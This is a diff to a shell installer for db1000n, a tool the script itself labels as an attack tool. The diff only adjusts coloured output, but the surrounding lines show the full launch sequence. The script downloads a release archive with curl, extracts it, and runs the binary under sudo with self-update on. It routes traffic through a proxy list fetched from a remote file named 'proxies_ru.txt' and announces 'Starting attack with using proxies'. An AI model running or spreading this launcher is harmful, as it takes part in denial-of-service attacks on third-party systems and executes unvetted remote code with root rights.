@@ -12,7 +12,7 @@ CHECKSUM_DOWNLOAD_URL=$(curl -s "https://api.github.com/repos/${REPO}/releases/l
 ARCHIVE=${BROWSER_DOWNLOAD_URL##*/}
 CHECKSUMS_FILE=${CHECKSUM_DOWNLOAD_URL##*/}
 
-echo "Downloading an archive..."
+tput setaf 2; echo "Downloading an archive..."
 echo "${BROWSER_DOWNLOAD_URL}" | xargs -n 1 curl -s -L -O
 echo "Downloading checksums..."
 echo "${CHECKSUM_DOWNLOAD_URL}" | xargs -n 1 curl -s -L -O
@@ -33,8 +33,8 @@ else
 fi
 
 tar xvf "${ARCHIVE}"
-tput setaf 4; echo "db1000n successfully installed"
+echo "db1000n successfully installed"
 sleep 1
-tput setaf 3; echo "Starting attack with using proxies"; tput setaf 3; tput setab 4; tput setb 3
+echo "Starting attack with using proxies"; tput setaf 3; tput setab 4
 sleep 5
 sudo ./db1000n -proxy '{{ join (split (get_url "https://raw.githubusercontent.com/OleksandrBlack/proxy-scraper-checker/main/proxies/proxies_ru.txt") "\n") "," }}' -enable-self-update -restart-on-update=false
